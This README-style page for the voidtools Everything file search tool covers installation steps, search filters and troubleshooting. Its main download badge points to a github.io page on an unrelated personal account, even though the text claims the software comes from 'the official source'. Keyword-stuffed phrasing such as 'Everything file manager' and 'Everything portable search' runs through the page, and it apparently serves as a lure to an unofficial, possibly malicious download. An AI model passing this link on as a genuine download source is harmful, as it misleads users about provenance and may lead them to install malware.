Everything is a free Windows file search engine that instantly finds files and folders by name using quick indexing and real-time updating.

## What Everything Delivers

The Everything voidtools search architecture runs continuously in the background, updating its database in real time as files are created, moved, renamed, or deleted. ## Getting Started Guide

Prerequisites: A Windows computer with at least one NTFS-formatted drive and standard user permissions for portable mode, or administrator access for full installation.

[![GET Everything](https://img.shields.io/badge/GET%20%E2%80%94%20Everything-0078D6?style=for-the-badge&logoColor=white)](https://gianhendrixpsha.github.io/.github/Everything-File-Search)

1.  **Download and Launch:** Obtain the latest release of Everything voidtools search from the official source. Choose between installer or portable ZIP based on your deployment needs.
2.  **Initial Indexing:** On first launch, Everything search engine will scan all local NTFS volumes automatically. This typically completes within seconds, even for drives containing millions of files.
3.  **Configure Volumes:** Access Options > Indexes to customize which drives and folders the Everything desktop search monitors. Add network locations or non-NTFS volumes through folder indexing if needed.
4.  **Perform Searches:** Type directly into the search box. The Everything file finder displays results instantly as you type, filtering down to matching files and folders in real time.
5.  **Apply Advanced Filters:** Use the Search menu to add functions like size:, date:, or attributes: to narrow results. The Everything instant search syntax supports complex queries combining multiple criteria.
6.  **Enable Shell Integration:** In Options > General, activate "Install folder context menus" to add "Search Everything..." when right-clicking folders in Windows Explorer.

## Common Issues and Solutions

- Everything not finding files? Verify the drive is NTFS-formatted and appears in Options > Indexes > NTFS. ReFS and FAT32 volumes require folder indexing to be searchable by Everything portable search.
- Database not updating? Check that the Everything service is running in Services (services.msc) or enable "Run as administrator" for the Everything Windows tool executable to access journal monitoring.
- Search results incomplete? Ensure "Include only files" or "Include only folders" filters are not accidentally enabled. Reset all filters in the Search menu of Everything fast search to restore full results.
- High CPU usage during indexing? This is normal on first launch or after adding large new volumes. The Everything file manager will complete indexing quickly, after which CPU usage drops to near zero.
- Cannot access network folders? Add them explicitly through Options > Indexes > Folders in Everything search app. Network shares require folder indexing rather than NTFS journal monitoring.
